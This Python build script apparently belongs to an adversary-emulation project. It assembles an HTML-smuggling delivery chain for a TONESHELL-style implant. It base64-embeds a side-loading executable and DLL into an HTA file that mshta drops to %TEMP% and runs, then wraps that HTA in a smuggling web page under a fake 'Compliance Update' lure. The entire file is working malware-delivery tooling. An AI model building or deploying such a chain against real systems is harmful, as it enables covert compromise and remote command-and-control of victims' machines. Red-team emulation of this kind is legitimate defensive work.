"""
build.py - Build the HTML-smuggling -> HTA delivery variant.

Chain:
    staging.html  (HTML smuggling page, served by the operator)
        -> reconstructs Essos_Compliance_Update.hta client-side (no server GET)
    Essos_Compliance_Update.hta  (executed by mshta.exe)
        -> drops EssosUpdate.exe + wsdapi.dll to %TEMP% and runs the loader
    EssosUpdate.exe -> wsdapi.dll sideload -> TONESHELL C2 (unchanged Step 1 chain)

Steps:
    1. Read EssosUpdate.exe and wsdapi.dll (the ToneShell sideload loader).
    2. Inject their base64 into stage1.tpl.hta  -> stage1.hta
    3. Base64-encode stage1.hta and inject into staging.tpl.html -> staging.html

Usage:
    python build.py
"""

import base64
import os

HERE = os.path.dirname(os.path.abspath(__file__))
TONESHELL = os.path.normpath(os.path.join(
    HERE, "..", "..", "rce-and-c2", "mustang-panda-emulation", "toneshell-v2"))

EXE_PATH = os.path.join(TONESHELL, "EssosUpdate.exe")
DLL_PATH = os.path.join(TONESHELL, "build", "src", "wsdapi", "Release", "wsdapi.dll")

HTA_TPL   = os.path.join(HERE, "stage1.tpl.hta")
HTML_TPL  = os.path.join(HERE, "staging.tpl.html")
HTA_OUT   = os.path.join(HERE, "stage1.hta")
HTML_OUT  = os.path.join(HERE, "staging.html")


def b64_of(path):
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode("ascii")


def main():
    for p in (EXE_PATH, DLL_PATH):
        if not os.path.exists(p):
            raise SystemExit(f"[!] missing input: {p}")

    exe_b64 = b64_of(EXE_PATH)
    dll_b64 = b64_of(DLL_PATH)

    with open(HTA_TPL, "r", encoding="utf-8") as f:
        hta = f.read()
    hta = hta.replace("@@EXE_B64@@", exe_b64).replace("@@DLL_B64@@", dll_b64)
    with open(HTA_OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write(hta)
    print(f"[+] {os.path.basename(HTA_OUT):<28} {len(hta):>10,} bytes")

    hta_b64 = base64.b64encode(hta.encode("utf-8")).decode("ascii")
    with open(HTML_TPL, "r", encoding="utf-8") as f:
        html = f.read()
    html = html.replace("@@HTA_B64@@", hta_b64)
    with open(HTML_OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write(html)
    print(f"[+] {os.path.basename(HTML_OUT):<28} {len(html):>10,} bytes")


if __name__ == "__main__":
    main()
